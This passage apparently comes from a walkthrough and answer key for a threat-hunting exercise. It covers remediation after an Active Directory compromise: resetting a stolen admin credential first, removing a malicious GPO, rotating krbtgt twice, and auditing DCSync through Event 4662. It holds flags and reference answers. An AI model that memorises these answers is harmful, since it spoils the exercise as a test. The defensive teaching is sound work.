> **Lesson:** A chain question tests causation, not chronology. Each step has to produce the thing that made the next one possible, from Kerberoast through crack and DCSync to Pass the Hash.

</details>

---

## 🛡️ Phase 12 — Remediation

<details>
<summary><strong>Q35 — R1 - Cut Access First</strong> · <code>the first action plus why</code></summary>

<!-- derivation: inference -->

**Goal**  State the first remediation move and why it comes before the artifacts.

**Briefing**  HUNT LEAD: "Before you touch the task, the GPO or the AnyDesk
service, one move comes first or they're back in instantly. What,
and why first."

Format: the first action plus why

**Approach**  This opened the remediation phase and tested whether you understand sequencing under a credential compromise. The lead listed the three footholds, the scheduled task, the domain linked policy and the AnyDesk service, then asked what single move has to happen before you touch any of them or the operator is back in instantly. The free hint pointed straight at the credential, cleanup that leaves the credential live just invites re-entry. The reasoning is that the operator does not depend on those artifacts to get back in. They hold the domain admin credential for d.williams, taken during the directory replication and replayed as a hash through Pass the Hash. So if you start deleting the task or the policy while that hash still authenticates, they simply pass it again and walk back in, and your cleanup accomplished nothing. The first action is therefore to reset the d.williams password, which changes the underlying NTLM hash and kills the exact secret they are reusing. Only once the credential is dead does removing the persistence artifacts actually stick. This is deliberately narrower than the full rotation question that follows, here you kill the one credential they are actively reusing for re-entry, there you rotate everything because the whole directory was replicated. The teaching point is that eradication order is dictated by what grants re-entry, and a stolen credential outranks any on disk artifact, so you burn the credential before you clean the artifacts.

**Results**  Remediation sequencing: stolen DA credential d.williams (DCSync then Pass-the-Hash, Q17/Q18) must be reset first; resetting the password invalidates the stolen NTLM hash and stops instant PtH re-entry, which has to precede removing the task/GPO/AnyDesk artifacts.

**Flag**  `Reset d.williams's domain admin password first. It kills the stolen hash they re-enter with, before removing any artifact.`

> **Lesson:** Eradication order is dictated by what grants re-entry. A stolen credential outranks any on-disk artifact, so reset the reused admin password before removing the task, the policy, or the tool.

</details>

<details>
<summary><strong>Q36 — R2 - Take Out the Policy</strong> · <code>short procedure</code></summary>

<!-- derivation: inference -->

**Goal**  Give the procedure to retire the malicious domain-wide policy.

**Briefing**  HUNT LEAD: "That domain-wide policy is still linked and still
deploying. Walk me through taking it out of action properly."

Format: short procedure

**Approach**  This was a procedure question about properly retiring the malicious Group Policy Object the operator linked at the domain root, the one named Greenfield Security Update that was still linked and still pushing its payload to every machine on each policy refresh. The free hint laid out the three parts and stressed that sequence matters. The reasoning is that a GPO does damage through three separate things, the link that makes it apply, the object itself, and the file it stages in SYSVOL for clients to pull. Removing only one leaves the others live. So the order is unlink first, which immediately stops the policy from applying anywhere and halts the bleeding, then delete the GPO object so it cannot be relinked or re-enabled, then go into SYSVOL and remove the payload it dropped so no client or leftover task can still fetch it. Doing it in the other order is worse, deleting the object before unlinking can leave a dangling link and an orphaned policy reference, and forgetting SYSVOL leaves the actual malicious file sitting in a share every domain member reads. The teaching point is that eradicating a deployment mechanism means tearing down every layer it used, the trigger, the object and the staged artifact, and doing it in the order that stops active harm first.

**Results**  GPO eradication sequence for 'Greenfield Security Update' linked at domain root (Q26/Q27): unlink first to stop it applying, delete the GPO object, then remove the payload it dropped in SYSVOL. Order matters: unlink before delete before SYSVOL cleanup.

**Flag**  `Unlink the GPO to stop deployment, delete it, then remove the payload it dropped in SYSVOL.`

> **Lesson:** Tearing down a deployment mechanism means every layer it used. Unlink the policy first to stop it applying, then delete the object, then remove the payload it staged in SYSVOL.

</details>

<details>
<summary><strong>Q37 — R3 - Rotate the Right Secrets</strong> · <code>what to rotate plus why one is done twice</code></summary>

<!-- derivation: briefing -->

**Goal**  State what the directory dump forces you to rotate and why one is done twice.

**Briefing**  HUNT LEAD: "They replicated the entire directory and you've named
the account that underwrites every ticket. What does that force
you to rotate, and why is one of them done twice."

Format: what to rotate plus why one is done twice

**Approach**  This question followed directly from the directory replication earlier in the hunt. Because the operator ran a full DCSync, they did not just steal a few passwords, they pulled the hash of every account in the domain, so the only safe assumption is that every credential is burned and the entire domain has to have its passwords rotated. That is the first half of the answer, rotate everything. The second half is about the one account named earlier as underwriting every ticket, krbtgt, the key the domain controller uses to sign and encrypt every Kerberos TGT. krbtgt is special because Active Directory deliberately keeps two krbtgt keys live at once, the current one and the immediately previous one, so that tickets issued just before a password change do not break. That backward compatibility is exactly what bites you here. If you reset krbtgt only once, the previous key the attacker stole is still accepted for one more cycle, so any Golden Ticket they forged keeps working. You have to reset it a second time to push the stolen key out of the valid window, and only then are forged tickets dead. The teaching point is that krbtgt is reset twice not as superstition but because of the two key rotation window, and that total directory replication forces a domain wide credential reset rather than a targeted one.

**Results**  Full DCSync replication (Q16/Q19) burns every credential, so rotate all account passwords; krbtgt is reset twice because the KDC keeps the previous krbtgt key valid for one cycle, so a single reset leaves forged Golden Tickets usable and only the second reset invalidates them.

**Flag**  `Rotate every credential, krbtgt twice, because the previous krbtgt key stays valid for one cycle and only the second reset kills it.`

> **Lesson:** A full directory replication forces a domain-wide reset, not a targeted one. krbtgt is rotated twice because the controller keeps the previous key valid for one cycle.

</details>

<details>
<summary><strong>Q38 — R4 - Name a Blind Spot</strong> · <code>the blind spot plus the logging fix</code></summary>

<!-- derivation: inference -->

**Goal**  Name a telemetry blind spot this intrusion exploited and the logging fix.

**Briefing**  HUNT LEAD: "Name one thing this intrusion did that your telemetry
couldn't see, and the logging change that closes it next time."

Format: the blind spot plus the logging fix

**Approach**  The closing question turned the lens on the defenders, asking for one thing the intrusion did that the telemetry could not see and the logging change that would close the gap next time. The free hint offered two genuine blind spots, the credential theft that never touched memory and the directory enumeration that left no audit record, and said to pick one. I took the credential theft, because it is the spine of this whole hunt. The operator used DCSync, which asks the domain controller to replicate account secrets over the directory replication protocol. Because the hashes arrive through a legitimate replication request, nothing ever reads LSASS and no process cracks open memory, so endpoint and memory based credential theft detection sees nothing at all. The logging change that catches it is to audit directory service access, placing a system access control entry on the replication extended rights so that any account requesting replication generates event 4662. A real domain controller replicating is normal, but a workstation or member server account suddenly pulling changes is the exact signature of DCSync, and with that audit in place it is loud rather than silent. The teaching point is that a blind spot is defined by the detection model, memory based tooling is blind to protocol based credential theft, and the fix is not more endpoint coverage but turning on the directory side audit that records the abuse of replication.

**Results**  Telemetry blind spot: DCSync (Q16/Q20) pulled hashes over directory replication without touching LSASS, so memory/EDR-based credential-theft detection was blind. Fix: enable directory service access auditing on the replication rights so a non-DC requesting replication logs Event 4662.

**Flag**  `DCSync took the hashes over replication, never touching LSASS, so EDR was blind. Audit directory replication so a non-DC replicating logs 4662.`

> **Lesson:** A blind spot is defined by the detection model. Memory-based tooling is blind to replication-based theft, and the fix is directory access auditing that logs a non-DC requesting replication.

</details>
